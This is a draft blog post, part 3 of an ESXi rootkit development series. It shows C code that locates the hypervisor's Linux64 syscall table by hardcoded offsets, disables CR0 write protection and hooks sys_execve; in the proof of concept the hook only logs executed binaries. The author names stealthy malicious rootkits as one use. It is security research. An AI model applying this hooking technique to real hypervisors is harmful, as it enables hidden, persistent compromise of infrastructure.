+++
title = 'ESXHiDE - ESXi Rootkit Development - Part 3'
date = 2024-09-30T23:47:39-05:00
draft = true
+++

## Looping Through Syscall Table

Once I was able to grab the base address of the `user` module, I was able to use an offset to find `Linux64_SyscallTable` and `Linux64_SyscallTableLen` variables and loop through them to print out the syscalls for some sanity check.

```
        uint64_t Linux64_SyscallTableLen = *(uint64_t*)(user_mod_addr + 0x935C0);
        SyscallTable_Entry* Linux64_SyscallTable = (SyscallTable_Entry*)(user_mod_addr + 0x935E0);

        for (i = 0; i < Linux64_SyscallTableLen; i++)
        {
            printk("SYSCALL TABLE ENTRY %d: %s -> %p\n", i, Linux64_SyscallTable[i].name, Linux64_SyscallTable[i].func);
        }
```

![](/images/2024-09-30-23-51-48.png)

Everything looks good and ready to hook!

## Hooking a Syscall & Profit

At this point, it's pretty straight forward hooks.  For my proof of concept, I hook `sys_execve` and print out the names of the binaries being executed to the kernel logs.  From here, anyone can build defensive anti-malware type tools or malicious kernel level rootkits on ESXi hypervisor to evade detection for possibly long term operations.

```
typedef asmlinkage int (*orig_sys_execve_t)(char *name, char **argv, char **envp);
orig_sys_execve_t orig_sys_execve;

asmlinkage int hooked_sys_execve(char *name, char **argv, char **envp)
{
    printk("execve(%s)\n", name);
    return orig_sys_execve(name, argv, envp);
}

...

        orig_sys_execve = (orig_sys_execve_t)Linux64_SyscallTable[__NR_execve].func;
        unsigned long cr0 = read_cr0();
        write_cr0(cr0 & ~X86_CR0_WP);

        Linux64_SyscallTable[__NR_execve].func = (uint64_t)hooked_sys_execve;
        write_cr0(cr0);
```

![](/images/2024-10-01-00-00-17.png)

Hopefully this was helpful to someone.  This technique can be applied to both Linux syscalls and ESXi syscalls.  I sure enjoyed researching this problem since there didn't seem to be a lot of resources on this.  I'll post a complete working rootkit later or maybe I'll wait and see what the smart people of the internet can come up with.
